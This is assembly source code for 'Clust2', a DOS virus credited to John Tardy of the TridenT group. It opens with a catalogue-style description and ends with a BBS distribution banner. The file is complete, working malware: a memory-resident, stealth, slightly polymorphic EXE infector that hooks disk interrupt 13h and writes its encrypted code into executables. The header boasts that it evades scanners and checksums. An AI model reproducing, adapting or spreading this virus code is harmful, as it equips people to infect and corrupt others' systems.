;
; Clust2 virus by John Tardy / TridenT
;
; Virus Name:  Clust2
; Aliases:     Cluster-II, Circus Clusters-II
; V Status:    Released
; Discovery:   Not (yet)
; Symptoms:    .EXE altered, possible "sector not found" errors on disk-drives,
;              decrease in aveable memory
; Origin:      The Netherlands
; Eff Length:  386 bytes (EXE size doesn't change)
; Type Code:   ORhE - Overwriting Resident .EXE Infector
; Detection Method:
; Removal Instructions: Delete infected files or copy infected files with the
;                       virus resident to a device driven unit.
;
; General Comments:
;       The Clust2 virus is not yet submitted to any antiviral authority. It
;       is from the TridenT Virus Research Centre and was written by someone
;       calling himself John Tardy. When an infected program is started, Clust2
;       will become resident in high memory, but below TOM. It hooks interrupt
;       13h and will try to load the program again. Because of it's stealth
;       abilities the original program is loaded and will execute normally.
;       The Clust2 virus infects files when a write request for interrupt 13h
;       is done. It will check if the buffer contains the 'MZ' signature and
;       that the candidate file isn't larger than 65000 bytes, and if there are
;       enough zeros in the EXE-header. If these contidions are met, Clust2
;       will convert the EXE file to a COM file and inserts it's code in the
;       buffer, allowing the original write request to proceed. This way it
;       evades critical errors. The Clust2 virus is also stealth and can't be
;       detected with virus scanners or checksumming software if the virus is
;       resident. File-length and date doesn't change regardless if Clust2
;       is resident. It's also a slighty polymorphic virus, mutating a few
;       bytes in it's decryptor. A wildcarded string is needed to find it.
;       The following text is encrypted within the
;       virus:
;
;        "[Clust2]"
;        "JT / TridenT"
;
;       The Clust2 virus not infect files on device driven units, like drives
;       compressed with DoubleSpace. It will disinfect when copied to such a
;       device.
;
;       Sometimes it will issue a "sector not found" error when a file is
;       copied to a disk drive.
;
;       The Clust2 virus doesn't do anything besides replicating.
;
		ORG	100H

JUMPIE:		JMP	SHORT JUMPER

		ORG	180H

JUMPER:		CLC
		MOV	CX,DECRLEN
MORPH		EQU	$-2
JASS:		LEA	SI,DECR
DECRYPT:	XOR	BYTE PTR [SI],0
TRIG		EQU	$-1
TRAG		EQU	$-2
TROG:		INC	SI
TREG:		LOOP	DECRYPT

DECR:		MOV	AX,3513H
		INT	21H
                MOV     OLD13,BX
		MOV	OLD13[2],ES
		MOV	AX,ES:[BX]
		CMP	AX,0FC80H
		JE	EXIT

DOINST:		MOV	AH,0DH
		INT	21H

                MOV     AX,CS
		DEC	AX
		MOV	DS,AX
		CMP	BYTE PTR DS:[0],'Z'
		JNE	EXIT
RESIT:		SUB	WORD PTR DS:[3],VIRPAR+19H
		SUB	WORD PTR DS:[12H],VIRPAR+19H
		LEA	SI,JUMPER
		MOV	DI,SI
		MOV	ES,DS:[12H]
		MOV	DS,CS
		MOV	CX,VIRLEN
		REP	MOVSB

		MOV	AX,2513H
		MOV	DS,ES
		LEA	DX,NEW13
		INT	21H

		PUSH	CS
		POP	ES
		MOV	BX,100H
                MOV     SP,BX
		MOV	AH,4AH
		INT	21H
		PUSH	CS
		POP	DS
                MOV     BX,DS:[2CH]
		MOV	ES,BX
                MOV     AH,49H
		INT	21H

                XOR     AX,AX
                MOV     DI,1
SEEK:           DEC     DI
		SCASW
		JNE	SEEK

                LEA     SI,DS:[DI+2]
EXEC:		PUSH	BX
		PUSH	CS
		POP	DS
		MOV	BX,OFFSET PARAM
                MOV     DS:[BX+4],CS
		MOV	DS:[BX+8],CS
		MOV	DS:[BX+12],CS
		POP	DS
		PUSH	CS
		POP	ES

                MOV     DI,OFFSET FILENAME
		PUSH	DI
		MOV	CX,40
		REP	MOVSW
		PUSH	CS
		POP	DS

                POP     DX

                MOV     AX,4B00H
		INT	21H
EXIT:           MOV     AH,4DH
		INT	21H
                MOV     AH,4CH
		INT	21H

OLD13		DW	0,0

ORG13:		JMP	D CS:[OLD13]

NEW13:		CMP	AH,3
		JE	CHECKEXE
                CMP     AH,2
		JNE	ORG13
DO:		PUSHF
		CALL	D CS:[OLD13]
		CMP	ES:[BX],7EEBH
		JNE	ERROR
		MOV	ES:[BX],'ZM'
		PUSH	DI
		PUSH	CX
		PUSH	AX

		MOV	CX,VIRLEN
		XOR	AX,AX
		LEA	DI,BX[80H]
		REP	STOSB

		POP	AX
		POP	CX
		POP	DI
ERROR:		IRET

CHECKEXE:       CMP     ES:[BX],'ZM'
                JNE     ORG13

                CMP     W ES:BX[4],(65000/512)
                JNB     ORG13

		PUSH	AX
		PUSH	CX
		PUSH	SI
		PUSH	DI
		PUSH	DS

		PUSH	ES
		POP	DS
		LEA	SI,BX[80H]
		MOV	DI,SI
		MOV	CX,VIRLEN
FIND0:		LODSB
		OR	AL,AL
		LOOPE	FIND0
		OR	CX,CX
		JNE	NO0

		XOR	AX,AX
		MOV	DS,AX
		MOV	AX,DS:[046CH]
		PUSH	CS
		POP	DS
		TEST	AH,1
		JZ	NOLOOPFLIP
		XOR	B TREG,2
NOLOOPFLIP:	TEST	AH,2
		JZ	NOCLCFLIP
		XOR	B JUMPER,1
NOCLCFLIP:
		ADD	AX,VIRLEN
		SHR	AX,1
		MOV	W MORPH,AX
		MOV	B TRIG,AH
		XOR	B TRAG,1
		XOR	B JASS,1
		XOR	B TROG,1
		MOV	CX,CRYPT
		LEA	SI,JUMPER
		REP	MOVSB
		MOV	CX,DECRLEN
		LEA	SI,DECR
CODEIT:		LODSB
		XOR	AL,AH
		STOSB
		LOOP	CODEIT
		MOV	DI,BX
		MOV	AX,07EEBH
		STOSW

NO0:		POP	DS
		POP	DI
		POP	SI
		POP	CX
		POP	AX
		JMP	ORG13

		DB	'[Clust2]'

PARAM           DW      0,80H,?,5CH,?,6CH,?

		DB	'JT / TridenT'

FILENAME	EQU	$
DECRLEN		EQU	$-DECR
CRYPT		EQU	DECR-JUMPER
VIRLEN		EQU	$-JUMPER
VIRPAR		EQU	($-JUMPER)/16



;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
